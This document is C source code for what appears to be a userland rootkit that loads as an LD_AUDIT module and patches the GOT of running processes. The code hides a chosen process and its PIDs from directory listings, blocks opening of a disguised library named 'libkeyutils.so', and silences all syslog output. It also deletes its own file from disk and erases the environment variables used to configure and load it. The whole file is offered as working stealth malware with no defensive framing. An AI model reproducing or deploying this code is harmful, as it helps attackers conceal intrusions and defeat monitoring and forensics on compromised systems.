#define _GNU_SOURCE
#include <link.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdarg.h>
#include <syslog.h>
#include <limits.h>

// ---------------------------------------------------------------------
// GLOBALS & CONFIG
// ---------------------------------------------------------------------

static char g_target_process[256] = {0};
static char g_my_path[PATH_MAX] = {0};

// Original function pointers (we might need these if we want to call original)
// However, since we are patching GOT, the PLT entry will point to us.
// To call the original, we should resolve it via dlsym(RTLD_NEXT) inside our hook,
// OR save the original address before overwriting the GOT.
// Saving is safer to avoid recursion if dlsym calls something we hooked (unlikely for these).
static int (*real_open)(const char *pathname, int flags, mode_t mode) = NULL;
static int (*real_openat)(int dirfd, const char *pathname, int flags, mode_t mode) = NULL;
static struct dirent *(*real_readdir)(DIR *dirp) = NULL;
static void (*real_syslog)(int priority, const char *format, ...) = NULL;
static void (*real_openlog)(const char *ident, int option, int facility) = NULL;

// ---------------------------------------------------------------------
// HOOKS
// ---------------------------------------------------------------------

// Helper: Check if we should hide this name
static int should_hide(const char* name) {
    if (!name) return 0;
    // Hide our own artifact
    if (strstr(g_my_path, name) != NULL && strlen(name) > 3) return 1;
    // Hide the target process name if set
    if (g_target_process[0] != '\0') {
        // Direct match
        if (strstr(name, g_target_process) != NULL) return 1;

        // Check if name is a PID (all digits)
        int is_pid = 1;
        for (int i = 0; name[i]; i++) {
            if (name[i] < '0' || name[i] > '9') {
                is_pid = 0;
                break;
            }
        }

        if (is_pid) {
            char comm_path[64];
            char comm_buf[256] = {0};
            snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", name);
            int fd = ((int (*)(const char *, int, mode_t))dlsym(RTLD_DEFAULT, "open"))(comm_path, O_RDONLY, 0);
            if (fd >= 0) {
                read(fd, comm_buf, sizeof(comm_buf) - 1);
                close(fd);
                // Remove newline
                char *newline = strchr(comm_buf, '\n');
                if (newline) *newline = '\0';

                if (strstr(comm_buf, g_target_process) != NULL) return 1;
            }
        }
    }
    return 0;
}

// ---------------------------------------------------------------------
// READDIR HOOK (Visibility Layer)
// ---------------------------------------------------------------------
static struct dirent *hooked_readdir(DIR *dirp) {
    if (!real_readdir) {
        // Use RTLD_DEFAULT to search global scope, as RTLD_NEXT fails in audit namespace
        real_readdir = (struct dirent *(*)(DIR *))dlsym(RTLD_DEFAULT, "readdir");
        if (!real_readdir) return NULL; // Critical failure fallback
    }

    struct dirent *entry;
    do {
        entry = real_readdir(dirp);
        if (entry && should_hide(entry->d_name)) {
            // Skip this entry, verify next
            continue;
        }
    } while (entry && should_hide(entry->d_name)); // Loop until safe entry or NULL

    return entry;
}

// ---------------------------------------------------------------------
// OPEN/OPENAT HOOK (Access Layer)
// ---------------------------------------------------------------------
static int hooked_open(const char *pathname, int flags, mode_t mode) {
    if (!real_open) {
        real_open = (int (*)(const char *, int, mode_t))dlsym(RTLD_DEFAULT, "open");
        if (!real_open) { errno = EACCES; return -1; }
    }

    // Protection: If accessing our artifact, deny it
    if (pathname && strstr(pathname, "libkeyutils.so") != NULL) {
        errno = ENOENT;
        return -1;
    }

    return real_open(pathname, flags, mode);
}

// ---------------------------------------------------------------------
// SYSLOG HOOK (Silence Layer)
// ---------------------------------------------------------------------
static void hooked_syslog(int priority, const char *format, ...) {
    // Silence. Do nothing.
    return;
}

static void hooked_openlog(const char *ident, int option, int facility) {
    // Silence.
    return;
}

// ---------------------------------------------------------------------
// CORE: GOT PATCHER
// ---------------------------------------------------------------------

// Helper to calculate page aligned address
static void* page_align(void* addr) {
    return (void*)((uintptr_t)addr & ~(getpagesize() - 1));
}

static void patch_got(void) {
    // We need to iterate over the loaded objects, find the main executable (or all),
    // and patch their GOT entries for the symbols we want to hook.
    // simpler approach: iterate over link_map.

    struct link_map *map = (struct link_map *)dlopen(NULL, RTLD_NOW);
    if (!map) return;

    // We can iterate the chain, but typically we want to patch the main binary (first in chain)
    // and maybe libc if it calls itself (rare via PLT).
    // Let's focus on the main binary and any other loaded libs that might call these.

    // Actually, dl_iterate_phdr is the robust way to walk all loaded objects.
}

static int patch_relocations(struct dl_phdr_info *info, size_t size, void *data) {
    // We are looking for DT_JMPREL (PLT relocations) and DT_REL/RELA (standard relocations)
    // in the dynamic section of the object.

    ElfW(Dyn) *dyn = NULL;
    ElfW(Word) pltrel_sz = 0;
    ElfW(Addr) jmprel_addr = 0;
    ElfW(Sym) *symtab = NULL;
    const char *strtab = NULL;
    ElfW(Word) rel_type = 0; // DT_REL or DT_RELA

    // Iterate program headers to find PT_DYNAMIC
    for (int i = 0; i < info->dlpi_phnum; i++) {
        if (info->dlpi_phdr[i].p_type == PT_DYNAMIC) {
            dyn = (ElfW(Dyn) *)(info->dlpi_addr + info->dlpi_phdr[i].p_vaddr);
            break;
        }
    }

    if (!dyn) return 0;

    // Parse .dynamic section
    for (ElfW(Dyn) *entry = dyn; entry->d_tag != DT_NULL; entry++) {
        switch (entry->d_tag) {
            case DT_PLTRELSZ: pltrel_sz = entry->d_un.d_val; break;
            case DT_JMPREL:   jmprel_addr = entry->d_un.d_ptr; break;
            case DT_SYMTAB:   symtab = (ElfW(Sym) *)entry->d_un.d_ptr; break;
            case DT_STRTAB:   strtab = (const char *)entry->d_un.d_ptr; break;
            case DT_PLTREL:   rel_type = entry->d_un.d_val; break;
        }
    }

    // Adjust addresses if they are relative (common in PIE/PIC)
    // If the addresses in dynamic section are absolute, we don't add dlpi_addr.
    // But often in PIE they are offsets or virtual addresses that need base added?
    // Actually, standard glibc ld.so usually resolves these to absolute pointers in the map?
    // No, d_ptr is usually a virtual address. If the object is PIE/shared, we need to add base.
    // If it's a non-PIE executable, base is 0.

    // Safety check: if addr is small, it's likely an offset.
    // However, the safest way is to trust that for shared objects, we add dlpi_addr.
    // For the main executable, if it's ET_DYN (PIE), dlpi_addr is non-zero. If ET_EXEC, it's 0.
    // So logic: always add dlpi_addr if the ptr looks like a vaddr offset.
    // Actually, let's just use the raw values + dlpi_addr logic which covers both cases usually.
    // Wait, if d_ptr is already absolute (pre-linked), adding base is wrong.
    // But dl_iterate_phdr info->dlpi_addr is the relocation base.

    // Let's try to resolve pointers.
    if (jmprel_addr < info->dlpi_addr) jmprel_addr += info->dlpi_addr;
    if ((void*)symtab < (void*)info->dlpi_addr) symtab = (ElfW(Sym) *)((uintptr_t)symtab + info->dlpi_addr);
    if ((void*)strtab < (void*)info->dlpi_addr) strtab = (const char *)((uintptr_t)strtab + info->dlpi_addr);

    if (jmprel_addr == 0 || pltrel_sz == 0 || symtab == NULL || strtab == NULL) return 0;

    // Iterate over PLT relocations
    // We handle both REL and RELA
    int is_rela = (rel_type == DT_RELA);

    // Calculate number of entries
    size_t num_rels = pltrel_sz / (is_rela ? sizeof(ElfW(Rela)) : sizeof(ElfW(Rel)));

    char* rel_base = (char*)jmprel_addr;

    for (size_t i = 0; i < num_rels; i++) {
        ElfW(Word) sym_index;
        void *rel_offset_ptr;

        if (is_rela) {
            ElfW(Rela) *rela = (ElfW(Rela) *)(rel_base + i * sizeof(ElfW(Rela)));
            sym_index = ELF64_R_SYM(rela->r_info);
            rel_offset_ptr = (void *)(info->dlpi_addr + rela->r_offset);
        } else {
            ElfW(Rel) *rel = (ElfW(Rel) *)(rel_base + i * sizeof(ElfW(Rel)));
            sym_index = ELF64_R_SYM(rel->r_info);
            rel_offset_ptr = (void *)(info->dlpi_addr + rel->r_offset);
        }

        const char *sym_name = strtab + symtab[sym_index].st_name;

        // Check if this symbol is one we want to hook
        void *hook_func = NULL;
        if (strcmp(sym_name, "readdir") == 0) hook_func = (void*)hooked_readdir;
        else if (strcmp(sym_name, "open") == 0) hook_func = (void*)hooked_open;
        else if (strcmp(sym_name, "syslog") == 0) hook_func = (void*)hooked_syslog;
        else if (strcmp(sym_name, "openlog") == 0) hook_func = (void*)hooked_openlog;

        if (hook_func) {
            // Overwrite the GOT entry!
            // First, make the page writable
            void *page = page_align(rel_offset_ptr);
            mprotect(page, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC);

            // Perform the swap
            *(void **)rel_offset_ptr = hook_func;

            // Restore protection (optional, but polite)
            mprotect(page, getpagesize(), PROT_READ | PROT_EXEC);
        }
    }
    return 0;
}


// ---------------------------------------------------------------------
// INITIALIZATION & CLEANUP
// ---------------------------------------------------------------------

__attribute__((constructor))
static void init_ghost(void) {
    // 1. Configuration: Get target process name
    char *env_path = getenv("GCONF_PATH");
    if (env_path) {
        strncpy(g_target_process, env_path, sizeof(g_target_process) - 1);
        unsetenv("GCONF_PATH"); // Erase evidence
    }

    // 2. Self-Identification & Cleanup
    Dl_info info;
    if (dladdr((void*)init_ghost, &info) && info.dli_fname) {
        strncpy(g_my_path, info.dli_fname, sizeof(g_my_path) - 1);
        unlink(g_my_path); // Delete from disk
    }

    // 3. Blind Inspection
    unsetenv("LD_AUDIT"); // Hide from /proc/self/environ

    // 4. Activate Hooks (GOT Patching)
    dl_iterate_phdr(patch_relocations, NULL);
}

// ---------------------------------------------------------------------
// LD_AUDIT INTERFACE
// ---------------------------------------------------------------------
// This is required for the linker to load us as an audit module.
unsigned int la_version(unsigned int version) {
    return version;
}

// We don't need other audit callbacks unless we want to hook things that
// are resolved lazily later, but dl_iterate_phdr in constructor covers
// everything loaded *so far*.
// NOTE: If the app dlopens something later, we might miss it unless we
// implement la_objopen. For now, the "Early-stage" requirement focuses on
// the main process startup.
